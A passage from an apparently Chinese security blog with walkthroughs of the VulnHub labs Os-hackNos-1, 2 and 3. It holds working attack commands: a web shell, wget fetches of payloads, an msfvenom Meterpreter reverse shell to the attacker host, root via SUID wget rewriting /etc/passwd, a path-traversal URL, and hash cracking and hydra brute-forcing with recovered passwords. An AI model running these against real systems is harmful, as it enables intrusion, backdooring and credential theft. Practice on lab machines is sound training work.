&#39;http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;shell.php&#39; -d &#39;c&#x3D;hostname&#39;</span><br><span class="line">hackNos&gt;&gt; id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><p>成功获取WebShell</p><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>查看服务器系统版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>使用weevely编写WebShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass wee.php</span><br><span class="line">mv wee.php wee</span><br></pre></td></tr></table></figure><p>在服务器上用wget下载WebShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.102&#x2F;wee</span><br><span class="line">mv wee wee.php</span><br></pre></td></tr></table></figure><p>连接WebShell<br /><code>weevely http://192.168.56.104/drupal/wee.php pass</code></p><p>使用MSFVenom编写后门<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1234 -f elf &gt; msf.elf</code></p><p>在服务器上用WebShell上传后门程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;drupal&#x2F;msf.elf</span><br><span class="line">ls -l msf.elf</span><br><span class="line">    -rw-r--r--  1 www-data www-data    250 Dec  2 18:37 msf.elf</span><br><span class="line">chmod 755 msf.elf</span><br><span class="line">    -rwxr-xr-x  1 www-data www-data    250 Dec  2 18:37 msf.elf</span><br><span class="line">hackNos: .&#x2F;msf.elf &amp;</span><br></pre></td></tr></table></figure><p>使用MSF进行渗透攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.56.102</span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>将meterpreter shell转为bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看具有suid权限且属于root用户的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign                          </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic              </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device                     </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine                           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1            </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd                                      </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;wget                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn                                         </span><br><span class="line">&#x2F;bin&#x2F;ping6                                            </span><br><span class="line">&#x2F;bin&#x2F;umount                                           </span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g                                          </span><br><span class="line">&#x2F;bin&#x2F;mount                                            </span><br><span class="line">&#x2F;bin&#x2F;ping                                             </span><br><span class="line">&#x2F;bin&#x2F;su                                               </span><br><span class="line">&#x2F;bin&#x2F;fusermount                                       </span><br></pre></td></tr></table></figure><p>可以用wget命令提权</p><p>对/etc/passwd文件进行间接修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hackNos: file_download &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">perl -le &#39;print crypt(&quot;happy_hacker&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    ad3sa&#x2F;MFODb7k</span><br><span class="line">echo &#39;test:ad3sa&#x2F;MFODb7k:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">hackNos: wget http:&#x2F;&#x2F;192.168.56.102&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>在bash中切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">happy_hacker</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p><strong>另一个思路</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">snap --version</span><br><span class="line"></span><br><span class="line">snap    2.34.2ubuntu0.1  </span><br><span class="line">snapd   2.34.2ubuntu0.1  </span><br><span class="line">series  16               </span><br><span class="line">ubuntu  16.04            </span><br><span class="line">kernel  4.4.0-142-generic</span><br></pre></td></tr></table></figure><p>CVE-2019-7304一把梭</p><hr /><p>补充一些细节<br />由于Kali在VMware下而Ubuntu在VBox，导致网络有些问题<br />Kali可以连通Ubuntu但是反之不行<br />即Kali可以用EXP获取Shell但Ubuntu不能反弹Shell给Kali<br />所以需要Windows用MSF接收反弹Shell</p><p>在EXP的Shell中，wget获取的文件权限为644且所有者为root，即不能直接wget一个Meterpreter后门程序并执行<br />但可以用wget获取weevely的WebShell，644的权限且所有者为root并不会影响WebShell的连接，而且在WebShell中，可以进行文件上传和下载，wget所得的文件权限为644，所有者为www-data，即可以用WebShell获取Meterpreter后门程序</p><p>在wget一个WebShell之前，要修改文件后缀名<br />服务器会把php后缀的文件解析并执行，就不能获取该php文件<br />而修改文件后缀名之后服务器则无法解析，从而获取WebShell<br />在获取之后修改文件后缀名为.php，并移动到Web目录下<br />即可连接WebShell</p><p>切换用户需要一个标准Shell<br />可以在Meterpreter中获取</p><hr /><h1 id="os-hacknos-2"><a class="markdownIt-Anchor" href="#os-hacknos-2"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/">Os-hackNos-2</a></h1><p><code>2020/01/10 23:58:25</code></p><h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2><p><code>nmap -sV -Pn -v -T5 -A 192.168.1.104</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.104</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)</span><br><span class="line">|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)</span><br><span class="line">|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-2"><a class="markdownIt-Anchor" href="#web路径枚举-2"></a> Web路径枚举</h2><p><code>dirb http://192.168.1.104 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.1.104&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;index.html (CODE:200|SIZE:10918)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;server-status (CODE:403|SIZE:278)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;                                                                  </span><br><span class="line">                                                                                                            </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-admin&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><p>Web服务采用了Wordpress框架</p><p>使用wpscan针对wordpress进行扫描</p><p><code>wpscan --url http://192.168.1.104/tsweb/ --enumerate u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] user</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>发现存在用户user</p><p><code>wpscan --url http://192.168.1.104/tsweb/ --enumerate p</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] gracemedia-media-player</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2013-07-21T15:09:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br></pre></td></tr></table></figure><p>存在插件<code>gracemedia-media-player</code></p><p>搜索得到相关EXP<br /><code>wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</code></p><p>得到两条重要信息</p><ul><li><code>rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash</code></li><li><code>flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash</code></li></ul><p>可以破解flag账户的密码</p><p>使用john进行字典爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwd</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br><span class="line"></span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><p>使用flag账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh flag@192.168.1.104</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><p>而登入时使用的是rbash，在进行操作时会很不方便，需要切换到bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;</span><br><span class="line">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure><p>以上三条命令均可(但是更推荐用下面的方法获取TTY)</p><p>或者使用python获取一个支持完全交互的TTY(如果目标机器上只有python3而没有python2，则改为python3执行即可)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>尝试直接sudo提权，失败</p><p>尝试在目标服务器内搜索信息</p><p>发现文件<code>/var/backups/passbkp/md5-hash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash </span><br><span class="line"></span><br><span class="line">$1$rohit$01Dl0NQKtgfeL08fGrggi0</span><br></pre></td></tr></table></figure><p>得到rohit账户的密码</p><p>使用john破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2</span><br><span class="line">john --show passwd2</span><br><span class="line"></span><br><span class="line">!%hack41</span><br></pre></td></tr></table></figure><p>切换到rohit账户，并尝试sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su rohit</span><br><span class="line">!%hack41</span><br><span class="line">sudo -i</span><br><span class="line">!%hack41</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>总体来看渗透难度并不高，但是这里我想稍微记录一些关于wpscan的内容<br />wpscan是一个基于ruby，针对wordpress框架的web扫描器<br />但是之前kali上一直运行不了wpscan，一直以为是wpscan软件的问题，多次失败之后才发现是ruby的问题<br />官网有这么一句话<br /><strong>(Optional but highly recommended: RVM)</strong><br />现在看来也觉得确实如此<br />所以一番折腾之后终于在非root用户上安装好了rvm，然后换ruby源，安装ruby2.5.5，换gem源，再用gem安装一遍wpscan<br />最后终归是能正常使用wpscan了</p><p>参考资料</p><blockquote><p><a href="https://rvm.io/rvm/install">rvm</a><br /><a href="https://ruby-china.org/wiki/rvm-guide">rvm</a><br /><a href="https://blog.51cto.com/autopython/1839229">wpscan</a><br /><a href="https://www.freebuf.com/sectool/174663.html">rvm</a><br /><a href="https://www.cnblogs.com/kuaile1314/p/12132730.html">wp</a></p></blockquote><hr /><h1 id="os-hacknos-3"><a class="markdownIt-Anchor" href="#os-hacknos-3"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/">Os-hackNos-3</a></h1><p><code>2020/01/19 21:46:32</code></p><h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.39</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.39</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)</span><br><span class="line">|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)</span><br><span class="line">|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: WebSec</span><br><span class="line">MAC Address: 08:00:27:19:3A:EE (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-3"><a class="markdownIt-Anchor" href="#web路径枚举-3"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径<br />未发现有效信息<br />在主页处有提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find the Bug</span><br><span class="line">You need extra WebSec </span><br></pre></td></tr></table></figure><p>发现存在Web路径<code>/websec</code><br />再针对该路径进一步扫描</p><p><code>dirb http://192.168.31.39/websec/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;0 (CODE:200|SIZE:4346)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;01 (CODE:200|SIZE:4644)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1 (CODE:200|SIZE:4644)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1x1 (CODE:200|SIZE:4644)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;about (CODE:200|SIZE:3754)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;About (CODE:200|SIZE:3754)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;admin (CODE:200|SIZE:1591)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;api (CODE:200|SIZE:0)                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;assets (CODE:301|SIZE:333)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;author (CODE:200|SIZE:4208)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;blog (CODE:200|SIZE:4346)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;category (CODE:200|SIZE:4366)                                              </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;cm (CODE:500|SIZE:0)                                                       </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;feed (CODE:200|SIZE:765)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;fm (CODE:200|SIZE:0)                                                       </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;index (CODE:200|SIZE:4346)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Index (CODE:200|SIZE:4346)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;lib (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;log (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;login (CODE:200|SIZE:1591)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;robots.txt (CODE:200|SIZE:65)                                              </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;search (CODE:200|SIZE:4346)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Search (CODE:200|SIZE:4346)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;sites (CODE:301|SIZE:331)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;src (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tag (CODE:200|SIZE:4361)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tags (CODE:200|SIZE:3554)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;test (CODE:301|SIZE:329)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;themes (CODE:301|SIZE:333)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tmp (CODE:301|SIZE:327)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2><p>WEB服务存在登录页面<br />主页中已经给出了一个联系邮箱:<code>contact@hacknos.com</code><br />可以利用hydra进行口令枚举</p><p>使用top6000弱口令进行枚举</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l contact@hacknos.com -P FuzzDicts-master&#x2F;passwordDict&#x2F;top6000.txt -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;</span><br></pre></td></tr></table></figure><p>未获得账户口令</p><p>使用cewl获取页面内容来作为口令<br /><code>cewl http://192.168.31.39/websec -w pass</code></p><p>使用网站内容作来枚举账户口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l contact@hacknos.com -P pass -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.31.39   login: contact@hacknos.com   password: Securityx</span><br></pre></td></tr></table></figure><p>得到Web账户权限</p><h2 id="权限提升-3"><a 